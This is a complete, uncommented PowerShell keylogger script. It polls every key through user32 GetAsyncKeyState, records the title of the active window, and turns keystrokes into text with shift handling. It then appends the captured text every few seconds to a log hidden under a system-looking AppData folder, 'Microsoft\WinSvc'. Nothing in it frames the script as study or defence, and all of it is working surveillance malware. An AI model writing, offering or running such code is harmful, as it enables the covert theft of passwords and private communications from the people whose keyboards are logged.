Add-Type -AssemblyName System.Windows.Forms
$s=@'
[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int k);
[DllImport("user32.dll")]public static extern IntPtr GetForegroundWindow();
[DllImport("user32.dll",CharSet=CharSet.Auto)]public static extern int GetWindowText(IntPtr h,System.Text.StringBuilder s,int n);
'@
$u=Add-Type -MemberDefinition $s -Name U -Namespace W -PassThru
$log="$env:APPDATA\Microsoft\WinSvc\keys.txt"
$map=@{8='[BS]';9='[TAB]';13="`n";27='[ESC]';32=' ';46='[DEL]';37='[<]';38='[^]';39='[>]';40='[v]';45='[INS]';33='[PGUP]';34='[PGDN]';35='[END]';36='[HOME]'}
$symU=@{48='0';49='1';50='2';51='3';52='4';53='5';54='6';55='7';56='8';57='9';186=';';187='=';188=',';189='-';190='.';191='/';192='`';219='[';220='\';221=']';222="'"}
$symS=@{48=')';49='!';50='@';51='#';52='$';53='%';54='^';55='&';56='*';57='(';186=':';187='+';188='<';189='_';190='>';191='?';192='~';219='{';220='|';221='}';222='"' }
$buf=New-Object Text.StringBuilder
$last=''; $t0=Get-Date
while($true){
  $sb=New-Object Text.StringBuilder 300
  $u::GetWindowText($u::GetForegroundWindow(),$sb,300) | Out-Null
  if($sb.ToString() -ne $last){ [void]$buf.Append("`n`n=== $($sb.ToString()) ===`n"); $last=$sb.ToString() }
  $sh=([Windows.Forms.Control]::ModifierKeys -band [Windows.Forms.Keys]::Shift) -ne 0
  foreach($i in 8..222){
    if(($u::GetAsyncKeyState($i) -band 0x8000) -ne 0){
      $ch=$null
      if($map.ContainsKey($i)){ $ch=$map[$i] }
      elseif($i -ge 65 -and $i -le 90){ $ch=if($sh){[char]$i}else{[char]([int]$i+32)} }
      elseif($symU.ContainsKey($i)){ $ch=if($sh){$symS[$i]}else{$symU[$i]} }
      elseif($i -ge 96 -and $i -le 105){ $ch="$($i-96)" }
      if($ch){ [void]$buf.Append($ch) }
    }
  }
  if($buf.Length -gt 0 -and (((Get-Date)-$t0).TotalSeconds -ge 2 -or $buf.Length -gt 400)){
    Add-Content $log -Value $buf.ToString() -NoNewline -Encoding UTF8; [void]$buf.Clear(); $t0=Get-Date
  }
  Start-Sleep -Milliseconds 25
}
